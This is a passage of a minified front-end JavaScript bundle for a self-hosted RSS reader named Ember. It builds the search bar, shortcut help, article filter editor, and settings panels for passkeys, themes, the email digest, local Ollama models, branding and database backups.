class="search svelte-1h259us" data-search-form=""><svg viewBox="0 0 24 24" width="17" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="11" cy="11" r="7"></circle><path d="M21 21l-4-4"></path></svg> <input data-testid="search-input" class="svelte-1h259us"/> <!></form> <div class="topbar-actions svelte-1h259us"><input type="file" accept=".opml,.xml,application/xml,text/xml" style="display:none" data-testid="opml-input"/> <!> <button data-user-chip=""><!></button></div> <!> <!> <!></header>`);function mc(e,t){qe(t,!0);let n=()=>M(ba,`$branding`,o),r=()=>M(Ca,`$sidebarCollapsed`,o),i=()=>M(ha,`$theme`,o),a=()=>M(Yi,`$user`,o),[o,s]=gt(),c=Wi(t,`mobile`,3,!1),l=Wi(t,`showBack`,3,!1),u=P(``),d=P(hn([])),f=P(!1),p=P(!1),m=P(void 0),h=P(``),g=P(!1);function _(e){let t=e.target;V(p)&&!t.closest(`[data-popover]`)&&!t.closest(`[data-user-chip]`)&&F(p,!1),V(f)&&!t.closest(`[data-search-results]`)&&!t.closest(`[data-search-form]`)&&F(f,!1)}Gi(()=>document.addEventListener(`click`,_)),Ki(()=>document.removeEventListener(`click`,_));async function v(e){e.preventDefault();let t=V(u).trim();if(!t){F(d,[],!0),F(f,!1);return}da.set({kind:`search`,query:t}),ja({kind:`search`,query:t}),F(f,!1)}function y(){if(F(u,``),F(d,[],!0),F(f,!1),ft(da).kind===`search`){let e={kind:`smart`,view:`fresh`};da.set(e),ja(e)}}let b;function x(){b&&clearTimeout(b);let e=V(u).trim();if(!e){F(d,[],!0),F(f,!1);return}b=setTimeout(async()=>{try{F(d,((await $.search(e,6)).data??[]).map(e=>({id:e.id,title:e.title,url:e.url})),!0),F(f,V(d).length>0)}catch{F(d,[],!0)}},220)}function S(){ha.update(e=>e===`light`?`dark`:`light`)}async function C(){if(!V(g)){F(g,!0);try{await ca(),await ja(ft(da))}finally{F(g,!1)}}}async function w(e){let t=e.currentTarget;if(t.files?.[0]){t.value=``,ao();return}}function ee(){ao()}function te(e){return(e?.[0]??`?`).toUpperCase()}var T=pc();let E;var ne=I(T),re=e=>{var n=Ys();H(`click`,n,()=>t.onBack?.()),W(e,n)},D=e=>{var n=Xs();H(`click`,n,()=>t.onToggleMobileSidebar?.()),W(e,n)};K(ne,e=>{c()&&l()?e(re):c()&&e(D,1)});var O=R(ne,2),ie=R(I(O));j(O);var ae=R(O,2),oe=R(I(ae),2);J(oe);var se=R(oe,2),ce=e=>{var t=Zs();H(`click`,t,y),W(e,t)},le=e=>{W(e,Qs())};K(se,e=>{V(u)?e(ce):e(le,-1)}),j(ae);var ue=R(ae,2),de=I(ue);zi(de,e=>F(m,e),()=>V(m));var fe=R(de,2),pe=e=>{var t=rc(),n=L(t),a=I(n),o=e=>{W(e,$s())},s=e=>{W(e,ec())};K(a,e=>{r()?e(o):e(s,-1)}),j(n);var c=R(n,2);let l;var u=R(c,2),d=I(u),f=e=>{W(e,tc())},p=e=>{W(e,nc())};K(d,e=>{i()===`dark`?e(f):e(p,-1)}),j(u),z(()=>{Y(n,`title`,r()?`Show sidebar`:`Hide sidebar`),l=q(c,1,`icon-btn svelte-1h259us`,null,l,{spinning:V(g)})}),H(`click`,n,()=>{Ca.update(e=>!e);try{localStorage.setItem(`ember:sidebar`,r()?`closed`:`open`)}catch{}}),H(`click`,c,C),H(`click`,u,S),W(e,t)};K(fe,e=>{c()||e(pe)});var me=R(fe,2);let he;var ge=I(me),_e=e=>{var t=ac(),n=L(t),r=I(n,!0);j(n);var i=R(n,2),o=e=>{var t=ic(),n=I(t,!0),r=R(n),i=I(r,!0);j(r),j(t),z(()=>{G(n,a().username),G(i,a().is_admin?`Administrator`:`Reader`)}),W(e,t)};K(i,e=>{c()||e(o)}),z(e=>G(r,e),[()=>te(a().username)]),W(e,t)};K(ge,e=>{a()&&e(_e)}),j(me),j(ue);var ve=R(ue,2),ye=e=>{var t=oc(),n=I(t,!0);j(t),z(()=>G(n,V(h))),W(e,t)};K(ve,e=>{V(h)&&e(ye)});var be=R(ve,2),xe=e=>{var t=cc();li(t,21,()=>V(d),e=>e.id,(e,t)=>{var n=sc(),r=I(n,!0);j(n),z(()=>{Y(n,`href`,V(t).url||`#`),G(r,V(t).title)}),W(e,n)}),j(t),W(e,t)};K(be,e=>{V(f)&&V(d).length>0&&e(xe)});var Se=R(be,2),Ce=e=>{var n=fc(),r=I(n),o=I(r),s=I(o,!0);j(o);var l=R(o,2),u=I(l),d=I(u,!0);j(u);var f=R(u,2),m=I(f,!0);j(f),j(l),j(r);var h=R(r,2),g=e=>{var t=dc(),n=L(t),r=R(n,2),a=I(r),o=e=>{var t=lc();Ie(),W(e,t)},s=e=>{var t=uc();Ie(),W(e,t)};K(a,e=>{i()===`dark`?e(o):e(s,-1)}),j(r),Ie(2),H(`click`,n,()=>{F(p,!1),C()}),H(`click`,r,()=>{F(p,!1),S()}),W(e,t)};K(h,e=>{c()&&e(g)});var _=R(h,2),v=R(_,2),y=R(v,2),b=R(y,4);j(n),z(e=>{G(s,e),G(d,a()?.username),G(m,a()?.email||`—`)},[()=>te(a()?.username??``)]),H(`click`,_,()=>{F(p,!1),t.onOpenSettings()}),H(`click`,v,()=>{F(p,!1),ao()}),H(`click`,y,()=>{F(p,!1),ee()}),H(`click`,b,()=>{F(p,!1),ta()}),W(e,n)};K(Se,e=>{V(p)&&e(Ce)}),j(T),z(()=>{E=q(T,1,`topbar svelte-1h259us`,null,E,{mobile:c()}),G(ie,` ${n().name??``}`),Y(oe,`placeholder`,c()?`Search…`:`Search all articles, sources, and notes…`),he=q(me,1,`user-chip svelte-1h259us`,null,he,{"icon-only":c()}),Y(me,`aria-label`,c()?`Account menu`:void 0)}),X(oe,()=>V(u),e=>F(u,e)),H(`input`,oe,x),H(`keydown`,oe,e=>{e.key===`Escape`&&y()}),H(`submit`,ae,v),H(`change`,de,w),H(`click`,me,()=>F(p,!V(p))),W(e,T),Je(),s()}var hc=U(`<tr><td class="svelte-11xj8pj"><kbd class="svelte-11xj8pj"> </kbd></td><td class="svelte-11xj8pj"> </td></tr>`),gc=U(`<div class="backdrop svelte-11xj8pj" role="dialog" aria-modal="true" aria-labelledby="shortcut-help-title" data-testid="shortcut-help"><div class="card svelte-11xj8pj"><header class="svelte-11xj8pj"><h2 id="shortcut-help-title" class="svelte-11xj8pj">Keyboard shortcuts</h2> <button class="close svelte-11xj8pj" aria-label="Close">×</button></header> <table class="svelte-11xj8pj"><tbody></tbody></table></div></div>`);function _c(e,t){qe(t,!0);let n=[[`j`,`Next article`],[`k`,`Previous article`],[`m`,`Toggle read on selected article`],[`s`,`Toggle star on selected article`],[`o`,`Open original article in a new tab`],[`r`,`Refresh sidebar + article list`],[`/`,`Focus the search bar`],[`?`,`Show this help`],[`Esc`,`Close this help`]];function r(e){e.key===`Escape`&&(e.preventDefault(),t.onClose())}Gi(()=>window.addEventListener(`keydown`,r)),Ki(()=>window.removeEventListener(`keydown`,r));var i=gc(),a=I(i),o=I(a),s=R(I(o),2);j(o);var c=R(o,2),l=I(c);li(l,21,()=>n,ai,(e,t)=>{var n=Qt(()=>h(V(t),2));let r=()=>V(n)[0],i=()=>V(n)[1];var a=hc(),o=I(a),s=I(o),c=I(s,!0);j(s),j(o);var l=R(o),u=I(l,!0);j(l),j(a),z(()=>{G(c,r()),G(u,i())}),W(e,a)}),j(l),j(c),j(a),j(i),H(`click`,s,function(...e){t.onClose?.apply(this,e)}),H(`click`,a,Bi(function(e){Ui.call(this,t,e)})),H(`click`,i,function(...e){t.onClose?.apply(this,e)}),W(e,i),Je()}var vc=U(`<p class="error svelte-19cjzvl" data-testid="filter-error"> </p>`),yc=U(`<button type="button" class="ghost svelte-19cjzvl">Cancel</button>`),bc=U(`<p class="muted svelte-19cjzvl">Loading…</p>`),xc=U(`<p class="muted svelte-19cjzvl">No filters yet.</p>`),Sc=U(`<li class="svelte-19cjzvl"><div class="info svelte-19cjzvl"><strong> </strong> <span class="rule svelte-19cjzvl"> </span> <span class="action svelte-19cjzvl"> </span></div> <div class="row-actions svelte-19cjzvl"><button type="button" class="ghost svelte-19cjzvl"> </button> <button type="button" class="ghost svelte-19cjzvl">Edit</button> <button type="button" class="ghost danger svelte-19cjzvl">Delete</button></div></li>`),Cc=U(`<ul class="svelte-19cjzvl"></ul>`),wc=U(`<div class="backdrop svelte-19cjzvl" role="dialog" aria-modal="true" aria-labelledby="filter-manager-title" data-testid="filter-manager"><div class="modal svelte-19cjzvl"><header class="svelte-19cjzvl"><h2 id="filter-manager-title" class="svelte-19cjzvl">Filters</h2> <button class="close svelte-19cjzvl" aria-label="Close">×</button></header> <!> <section class="form svelte-19cjzvl" aria-label="New or edit filter"><label class="svelte-19cjzvl"><span>Name</span> <input placeholder="Hide crypto news" data-testid="filter-name" class="svelte-19cjzvl"/></label> <div class="row svelte-19cjzvl"><label class="svelte-19cjzvl"><span>Field</span> <select data-testid="filter-field" class="svelte-19cjzvl"><option>Title</option><option>Content</option><option>Author</option><option>URL</option></select></label> <label class="svelte-19cjzvl"><span>Op</span> <select data-testid="filter-op" class="svelte-19cjzvl"><option>contains</option><option>equals</option><option>starts with</option><option>matches (regex)</option></select></label></div> <label class="svelte-19cjzvl"><span>Value</span> <input placeholder="crypto" data-testid="filter-value" class="svelte-19cjzvl"/></label> <label class="checkbox svelte-19cjzvl"><input type="checkbox" class="svelte-19cjzvl"/> <span>Case sensitive</span></label> <div class="row svelte-19cjzvl"><label class="svelte-19cjzvl"><span>Action</span> <select data-testid="filter-action" class="svelte-19cjzvl"><option>Mark read</option><option>Star</option><option>Hide (mark read)</option></select></label> <label class="checkbox svelte-19cjzvl"><input type="checkbox" class="svelte-19cjzvl"/> <span>Enabled</span></label></div> <div class="actions svelte-19cjzvl"><!> <button type="button" data-testid="filter-save" class="svelte-19cjzvl"> </button></div></section> <hr class="svelte-19cjzvl"/> <section class="list svelte-19cjzvl"><!></section></div></div>`);function Tc(e,t){qe(t,!0);let n=P(hn([])),r=P(!1),i=P(``),a=()=>({id:null,name:``,field:`title`,op:`contains`,value:``,case_sensitive:!1,action:`mark_read`,enabled:!0}),o=P(hn(a()));async function s(){F(r,!0),F(i,``);try{F(n,(await $.listFilters()).data??[],!0)}catch(e){F(i,e instanceof Z?e.message:String(e),!0)}finally{F(r,!1)}}Gi(s);function c(e){let t=JSON.parse(e.match_json);F(o,{id:e.id,name:e.name,field:t.field,op:t.op,value:t.value,case_sensitive:t.case_sensitive??!1,action:e.action,enabled:e.enabled},!0)}async function l(){ao()}async function u(e){try{await $.deleteFilter(e),await s()}catch(e){F(i,e instanceof Z?e.message:String(e),!0)}}async function d(e){try{await $.updateFilter(e.id,{enabled:!e.enabled}),await s()}catch(e){F(i,e instanceof Z?e.message:String(e),!0)}}function f(e){try{let t=JSON.parse(e.match_json);return`${t.field} ${t.op} "${t.value}"`}catch{return e.match_json}}var p=wc(),m=I(p),h=I(m),g=R(I(h),2);j(h);var _=R(h,2),v=e=>{var t=vc(),n=I(t,!0);j(t),z(()=>G(n,V(i))),W(e,t)};K(_,e=>{V(i)&&e(v)});var y=R(_,2),b=I(y),x=R(I(b),2);J(x),j(b);var S=R(b,2),C=I(S),w=R(I(C),2),ee=I(w);ee.value=ee.__value=`title`;var te=R(ee);te.value=te.__value=`content`;var T=R(te);T.value=T.__value=`author`;var E=R(T);E.value=E.__value=`url`,j(w),j(C);var ne=R(C,2),re=R(I(ne),2),D=I(re);D.value=D.__value=`contains`;var O=R(D);O.value=O.__value=`equals`;var ie=R(O);ie.value=ie.__value=`starts_with`;var ae=R(ie);ae.value=ae.__value=`matches`,j(re),j(ne),j(S);var oe=R(S,2),se=R(I(oe),2);J(se),j(oe);var ce=R(oe,2),le=I(ce);J(le),Ie(2),j(ce);var ue=R(ce,2),de=I(ue),fe=R(I(de),2),pe=I(fe);pe.value=pe.__value=`mark_read`;var me=R(pe);me.value=me.__value=`star`;var he=R(me);he.value=he.__value=`hide`,j(fe),j(de);var ge=R(de,2),_e=I(ge);J(_e),Ie(2),j(ge),j(ue);var ve=R(ue,2),ye=I(ve),be=e=>{var t=yc();H(`click`,t,()=>F(o,a(),!0)),W(e,t)};K(ye,e=>{V(o).id!==null&&e(be)});var xe=R(ye,2),Se=I(xe,!0);j(xe),j(ve),j(y);var Ce=R(y,4),we=I(Ce),Te=e=>{W(e,bc())},Ee=e=>{W(e,xc())},De=e=>{var t=Cc();li(t,21,()=>V(n),e=>e.id,(e,t)=>{var n=Sc(),r=I(n),i=I(r),a=I(i,!0);j(i);var o=R(i,2),s=I(o,!0);j(o);var l=R(o,2),p=I(l);j(l),j(r);var m=R(r,2),h=I(m),g=I(h,!0);j(h);var _=R(h,2),v=R(_,2);j(m),j(n),z(e=>{Y(n,`data-testid`,`filter-row-${V(t).id??``}`),G(a,V(t).name),G(s,e),G(p,`→ ${V(t).action??``}`),G(g,V(t).enabled?`Disable`:`Enable`)},[()=>f(V(t))]),H(`click`,h,()=>d(V(t))),H(`click`,_,()=>c(V(t))),H(`click`,v,()=>u(V(t).id)),W(e,n)}),j(t),W(e,t)};K(we,e=>{V(r)?e(Te):V(n).length===0?e(Ee,1):e(De,-1)}),j(Ce),j(m),j(p),z(()=>G(Se,V(o).id===null?`Add filter`:`Save changes`)),H(`click`,g,function(...e){t.onClose?.apply(this,e)}),X(x,()=>V(o).name,e=>V(o).name=e),Ti(w,()=>V(o).field,e=>V(o).field=e),Ti(re,()=>V(o).op,e=>V(o).op=e),X(se,()=>V(o).value,e=>V(o).value=e),Fi(le,()=>V(o).case_sensitive,e=>V(o).case_sensitive=e),Ti(fe,()=>V(o).action,e=>V(o).action=e),Fi(_e,()=>V(o).enabled,e=>V(o).enabled=e),H(`click`,xe,l),H(`click`,m,Bi(function(e){Ui.call(this,t,e)})),H(`click`,p,function(...e){t.onClose?.apply(this,e)}),W(e,p),Je()}var Ec=U(`<button class="back-btn svelte-1u3w06f" aria-label="Back to settings menu" data-testid="settings-back"><svg viewBox="0 0 24 24" width="22" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M15 18l-6-6 6-6"></path></svg></button> <h2 id="settings-title" class="svelte-1u3w06f"> </h2>`,1),Dc=U(`<h2 id="settings-title" class="svelte-1u3w06f">Settings</h2>`),Oc=U(`<button data-testid="settings-llm">Language model</button> <button data-testid="settings-branding">Branding</button> <button data-testid="settings-database">Database</button> <button data-testid="settings-session">Sessions</button> <button data-testid="settings-email">Email / SMTP</button> <button data-testid="settings-users">Users</button>`,1),kc=U(`<p class="error svelte-1u3w06f" data-testid="pw-error"> </p>`),Ac=U(`<p class="ok svelte-1u3w06f" data-testid="pw-msg"> </p>`),jc=U(`<h3 class="svelte-1u3w06f">Profile</h3> <div class="row svelte-1u3w06f"><label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Username</span> <input type="text" disabled="" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Email</span> <input type="email" disabled="" placeholder="not set" class="svelte-1u3w06f"/></label></div> <p class="hint svelte-1u3w06f">Email is managed by your administrator.</p> <h4 class="svelte-1u3w06f">Change password</h4> <!> <!> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Current password</span> <input type="password" autocomplete="current-password" data-testid="pw-old" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">New password</span> <input type="password" autocomplete="new-password" data-testid="pw-new" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Confirm new password</span> <input type="password" autocomplete="new-password" class="svelte-1u3w06f"/></label> <div class="actions svelte-1u3w06f"><button data-testid="pw-submit" class="svelte-1u3w06f"> </button></div>`,1),Mc=U(`<p class="hint svelte-1u3w06f">Your browser doesn't support passkeys.</p>`),Nc=U(`<p class="error svelte-1u3w06f"> </p>`),Pc=U(`<p class="ok svelte-1u3w06f"> </p>`),Fc=U(`<p class="hint svelte-1u3w06f">No passkeys registered yet.</p>`),Ic=U(`<li class="list-row"><div><div class="list-title"> </div> <div class="list-sub"> <!></div></div> <button class="btn-danger">Remove</button></li>`),Lc=U(`<ul class="list"></ul>`),Rc=U(`<p class="hint svelte-1u3w06f">Passkeys let you sign in without a password using a fingerprint, face scan, or
+              hardware key. Each device you register here can be used at sign-in.</p> <!> <!> <h4 class="svelte-1u3w06f">Add a passkey</h4> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Name this device</span> <input type="text" placeholder="e.g. MacBook Touch ID" maxlength="60" class="svelte-1u3w06f"/></label> <div class="actions svelte-1u3w06f"><button data-testid="passkey-register" class="svelte-1u3w06f"> </button></div> <h4 class="svelte-1u3w06f">Your passkeys</h4> <!>`,1),zc=U(`<h3 class="svelte-1u3w06f">Passkeys</h3> <!>`,1),Bc=U(`<button><span class="theme-swatches svelte-1u3w06f"><span class="sw paper svelte-1u3w06f"></span> <span class="sw ink svelte-1u3w06f"></span> <span class="sw ember svelte-1u3w06f"></span></span> <span class="theme-label svelte-1u3w06f"> </span></button>`),Vc=U(`<div class="pref-row custom-editor svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f">Custom palette</div> <div class="pref-hint svelte-1u3w06f">Pick four colors — the rest of the palette is derived automatically.</div></div> <div class="color-pickers svelte-1u3w06f"><label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Background</span> <input type="color" data-testid="custom-paper" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Text</span> <input type="color" data-testid="custom-ink" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Accent</span> <input type="color" data-testid="custom-ember" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Links</span> <input type="color" data-testid="custom-link" class="svelte-1u3w06f"/></label></div></div>`),Hc=U(`<h3 class="svelte-1u3w06f">Preferences</h3> <div class="pref-row svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f">Theme</div> <div class="pref-hint svelte-1u3w06f">Auto matches your OS light/dark setting. Stored locally per-user.</div></div> <div class="theme-grid svelte-1u3w06f"></div></div> <!> <div class="pref-row svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f">Article density</div> <div class="pref-hint svelte-1u3w06f">Cards have excerpts and actions. Compact shows just titles.</div></div> <div class="seg svelte-1u3w06f"><button>Cards</button> <button>Compact</button></div></div> <div class="pref-row svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f">AI summary card</div> <div class="pref-hint svelte-1u3w06f">When off, the article body is shown directly with no summary card.</div></div> <div class="seg svelte-1u3w06f"><button data-testid="pref-summary-on">On</button> <button data-testid="pref-summary-off">Off</button></div></div>`,1),Uc=U(`<h3 class="svelte-1u3w06f">Mobile clients</h3> <p class="hint svelte-1u3w06f">Reeder, FeedMe, and other Fever-compatible apps can connect using the URL and key
+            below. The key is derived from your username and user ID — if it leaks, change your
+            username via the admin.</p> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Fever URL</span> <input type="text" readonly="" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">API key</span> <input type="text" readonly="" data-testid="fever-key" class="svelte-1u3w06f"/></label> <div class="actions svelte-1u3w06f"><button class="ghost svelte-1u3w06f">Copy key</button></div>`,1),Wc=U(`<h3 class="svelte-1u3w06f">Filters</h3> <p class="hint svelte-1u3w06f">Rules applied to new articles as they arrive. Open the editor to add, disable, or
+            delete filters.</p> <div class="actions svelte-1u3w06f"><button data-testid="open-filters" class="svelte-1u3w06f">Open filter editor</button></div>`,1),Gc=U(`<p class="error svelte-1u3w06f"> </p>`),Kc=U(`<p class="muted">Loading…</p>`),qc=U(`<tr><td class="svelte-1u3w06f"> </td><td class="svelte-1u3w06f"> </td></tr>`),Jc=U(`<h4 class="svelte-1u3w06f">Top feeds (last 30 days)</h4> <table class="llm-table svelte-1u3w06f"><thead><tr><th class="svelte-1u3w06f">Feed</th><th class="svelte-1u3w06f">Read</th></tr></thead><tbody></tbody></table>`,1),Yc=U(`<div class="stats-grid svelte-1u3w06f"><div class="stat-card svelte-1u3w06f"><div class="stat-num svelte-1u3w06f" data-testid="stat-today"> </div> <div class="stat-label svelte-1u3w06f">Read today</div></div> <div class="stat-card svelte-1u3w06f"><div class="stat-num svelte-1u3w06f"> </div> <div class="stat-label svelte-1u3w06f">Read this week</div></div> <div class="stat-card svelte-1u3w06f"><div class="stat-num svelte-1u3w06f"> </div> <div class="stat-label svelte-1u3w06f">Read in 30 days</div></div> <div class="stat-card svelte-1u3w06f"><div class="stat-num svelte-1u3w06f"> </div> <div class="stat-label svelte-1u3w06f">Starred total</div></div> <div class="stat-card svelte-1u3w06f"><div class="stat-num svelte-1u3w06f"> </div> <div class="stat-label svelte-1u3w06f">Read later</div></div> <div class="stat-card svelte-1u3w06f"><div class="stat-num svelte-1u3w06f"> </div> <div class="stat-label svelte-1u3w06f">Subscriptions</div></div></div> <!>`,1),Xc=U(`<h3 class="svelte-1u3w06f">Reading stats</h3> <!> <!>`,1),Zc=U(`<p class="error svelte-1u3w06f"> </p>`),Qc=U(`<p class="ok svelte-1u3w06f" data-testid="digest-msg"> </p>`),$c=U(`<p class="muted">Loading…</p>`),el=U(`<div class="pref-row svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f">Enabled</div> <div class="pref-hint svelte-1u3w06f">Sends one email per day. Skipped silently when no new articles match.</div></div> <div class="seg svelte-1u3w06f"><button data-testid="digest-on">On</button> <button data-testid="digest-off">Off</button></div></div> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">View</span> <select data-testid="digest-view" class="svelte-1u3w06f"><option class="svelte-1u3w06f">Fresh (last 24h)</option><option class="svelte-1u3w06f">Today</option><option class="svelte-1u3w06f">All unread</option><option class="svelte-1u3w06f">Starred</option><option class="svelte-1u3w06f">Read later</option></select> <span class="pref-hint svelte-1u3w06f">Saved searches, feeds and folders can be wired in later; smart views are the common case.</span></label> <div class="rec-row svelte-1u3w06f"><label class="inline-label svelte-1u3w06f"><span class="svelte-1u3w06f">Hour (UTC)</span> <input type="number" min="0" max="23" data-testid="digest-hour" class="svelte-1u3w06f"/></label> <label class="inline-label svelte-1u3w06f"><span class="svelte-1u3w06f">Minute (UTC)</span> <input type="number" min="0" max="59" data-testid="digest-minute" class="svelte-1u3w06f"/></label></div> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Email override</span> <input type="email" placeholder="optional — defaults to your account email" data-testid="digest-email" class="svelte-1u3w06f"/></label> <div class="actions svelte-1u3w06f"><button data-testid="digest-save" class="svelte-1u3w06f"> </button></div>`,1),tl=U(`<h3 class="svelte-1u3w06f">Daily digest</h3> <p class="hint svelte-1u3w06f">Get an email at a fixed time each day with the articles in your chosen view. Requires the server to have SMTP configured.</p> <!> <!> <!>`,1),nl=U(`<p class="error svelte-1u3w06f"> </p>`),rl=U(`<p class="ok svelte-1u3w06f" data-testid="starter-msg"> </p>`),il=U(`<button class="pack-btn pack-btn-remove svelte-1u3w06f"> </button>`),al=U(`<button class="pack-btn svelte-1u3w06f"> </button>`),ol=U(`<div class="pack svelte-1u3w06f"><div><div class="pack-name svelte-1u3w06f"><span class="pack-dot svelte-1u3w06f"></span> </div> <div class="pack-hint svelte-1u3w06f"> <!></div></div> <!></div>`),sl=U(`<h3 class="svelte-1u3w06f">Starter packs</h3> <p class="hint svelte-1u3w06f">Curated bundles of feeds. Click a pack to create the folder and subscribe — already-subscribed feeds are skipped.</p> <!> <!> <div class="pack-list svelte-1u3w06f"></div>`,1),cl=U(`<p class="error svelte-1u3w06f" data-testid="llm-error"> </p>`),ll=U(`<p class="ok svelte-1u3w06f" data-testid="llm-msg"> </p>`),ul=U(`<p class="muted">Loading…</p>`),dl=U(`<p class="muted">Summaries are disabled on this server (EMBER_DISABLE_SUMMARIES=1).</p>`),fl=U(`<button class="pack-btn svelte-1u3w06f" data-testid="llm-use-recommended">Use this</button>`),pl=U(`<p class="error svelte-1u3w06f"> </p>`),ml=U(`<p class="muted">No models installed yet. Pull one below.</p>`),hl=U(`<span class="muted">active</span>`),gl=U(`<button class="pack-btn svelte-1u3w06f"> </button> <button class="ghost-btn svelte-1u3w06f"> </button>`,1),_l=U(`<tr><td class="svelte-1u3w06f"><code class="svelte-1u3w06f"> </code></td><td class="svelte-1u3w06f"> </td><td class="llm-actions svelte-1u3w06f"><!></td></tr>`),vl=U(`<table class="llm-table svelte-1u3w06f"><thead><tr><th class="svelte-1u3w06f">Name</th><th class="svelte-1u3w06f">Size</th><th class="svelte-1u3w06f"></th></tr></thead><tbody></tbody></table>`),yl=U(`<p class="ok svelte-1u3w06f" data-testid="tune-msg"> </p>`),bl=U(`<h4 class="svelte-1u3w06f">This host</h4> <dl class="kv svelte-1u3w06f"><dt class="svelte-1u3w06f">RAM</dt><dd class="svelte-1u3w06f"> </dd> <dt class="svelte-1u3w06f">CPUs</dt><dd class="svelte-1u3w06f"> </dd> <dt class="svelte-1u3w06f">GPU</dt><dd class="svelte-1u3w06f"> </dd> <dt class="svelte-1u3w06f">OS</dt><dd class="svelte-1u3w06f"> </dd></dl> <h4 class="svelte-1u3w06f">Recommendation</h4> <div class="rec-row svelte-1u3w06f"><div><div class="pref-label svelte-1u3w06f"> </div> <div class="pref-hint svelte-1u3w06f"> </div></div> <!></div> <h4 class="svelte-1u3w06f">Active model</h4> <p data-testid="llm-current"><strong> </strong></p> <h4 class="svelte-1u3w06f">Installed</h4> <!> <h4 class="svelte-1u3w06f">Tuning</h4> <p class="hint svelte-1u3w06f">Generation parameters passed to Ollama. 0 means "use the model default".</p> <!> <div class="tune-row svelte-1u3w06f"><label class="svelte-1u3w06f"><span class="tune-label svelte-1u3w06f">Temperature <em class="svelte-1u3w06f"> </em></span> <input type="range" min="0" max="2" step="0.05" data-testid="tune-temp" class="svelte-1u3w06f"/> <span class="tune-hint svelte-1u3w06f">0 = deterministic, 1 = default, &gt;1 = creative</span></label> <label class="svelte-1u3w06f"><span class="tune-label svelte-1u3w06f">Top P <em class="svelte-1u3w06f"> </em></span> <input type="range" min="0" max="1" step="0.05" data-testid="tune-top-p" class="svelte-1u3w06f"/> <span class="tune-hint svelte-1u3w06f">Lower = focused, higher = diverse</span></label> <label class="svelte-1u3w06f"><span class="tune-label svelte-1u3w06f">Context window <em class="svelte-1u3w06f"> </em></span> <input type="range" min="0" max="16384" step="512" data-testid="tune-ctx" class="svelte-1u3w06f"/> <span class="tune-hint svelte-1u3w06f">Max tokens the model considers. 0 = model default (usually 2048)</span></label></div> <div class="actions svelte-1u3w06f"><button data-testid="tune-save" class="svelte-1u3w06f"> </button></div> <h4 class="svelte-1u3w06f">Pull a new model</h4> <p class="hint svelte-1u3w06f">e.g. <code>qwen2.5:0.5b</code>, <code>qwen2.5:1.5b</code>, <code>llama3.2:1b</code>. Downloads can take several minutes.</p> <div class="rec-row svelte-1u3w06f"><input type="text" placeholder="qwen2.5:0.5b" data-testid="llm-pull-input" class="svelte-1u3w06f"/> <button class="pack-btn svelte-1u3w06f" data-testid="llm-pull-submit"> </button></div>`,1),xl=U(`<h3 class="svelte-1u3w06f">Language model</h3> <p class="hint svelte-1u3w06f">Switch models or pull new ones from Ollama. The recommendation matches what fits your host.</p> <!> <!> <!>`,1),Sl=U(`<p class="error svelte-1u3w06f"> </p>`),Cl=U(`<p class="ok svelte-1u3w06f" data-testid="branding-msg"> </p>`),wl=U(`<h3 class="svelte-1u3w06f">Branding</h3> <p class="hint svelte-1u3w06f">Change the app name, browser tab title, and favicon shown to all users. Leave a field blank to restore the default.</p> <!> <!> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">App name</span> <input type="text" placeholder="Ember" data-testid="branding-name" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Browser tab title</span> <input type="text" placeholder="Ember" data-testid="branding-title" class="svelte-1u3w06f"/></label> <label class="svelte-1u3w06f"><span class="svelte-1u3w06f">Favicon URL</span> <input type="text" placeholder="/icon.svg or data:image/svg+xml;..." data-testid="branding-favicon" class="svelte-1u3w06f"/> <span class="pref-hint svelte-1u3w06f">Public URL (e.g. /icon.svg, https://…/icon.png) or a data: URI. Hard-refresh after changing.</span></label> <div class="actions svelte-1u3w06f"><button class="ghost svelte-1u3w06f">Reset to defaults</button> <button data-testid="branding-save" class="svelte-1u3w06f"> </button></div>`,1),Tl=U(`<p class="error svelte-1u3w06f"> </p>`),El=U(`<p class="ok svelte-1u3w06f" data-testid="db-msg"> </p>`),Dl=U(`<p class="muted">Loading…</p>`),Ol=U(`<tr><td class="svelte-1u3w06f"><code class="svelte-1u3w06f"> </code></td><td class="svelte-1u3w06f"> </td><td class="svelte-1u3w06f"> </td></tr>`),kl=U(`<h4 class="svelte-1u3w06f">Recent backups</h4> <table class="llm-table svelte-1u3w06f"><thead><tr><th class="svelte-1u3w06f">File</th><th class="svelte-1u3w06f">Size</th><th class="svelte-1u3w06f">Created</th></tr></thead><tbody></tbody></table>`,1),Al=U(`<h4 class="svelte-1u3w06f">Status</h4> <dl class="kv svelte-1u3w06f"><dt class="svelte-1u3w06f">Size on disk</dt><dd class="svelte-1u3w06f"> </dd> <dt class="svelte-1u3w06f">Page count</dt><dd class="svelte-1u3w06f"> </dd> <dt class="svelte-1u3w06f">Backup directory</dt><dd class="svelte-1u3w06f"><code> </code></dd></dl> <h4 class="svelte-1u3w06f">Manual backup</h4> <p class="hint svelte-1u3w06f">Writes a compacted snapshot to <code> </code>. Safe to run while ember is serving.</p> <div class="actions svelte-1u3w06f"><button data-testid="db-backup" class="svelte-1u3w06f"> </button></div> <!> <h4 class="svelte-1u3w06f">Manual cleanup</h4> <p class="hint 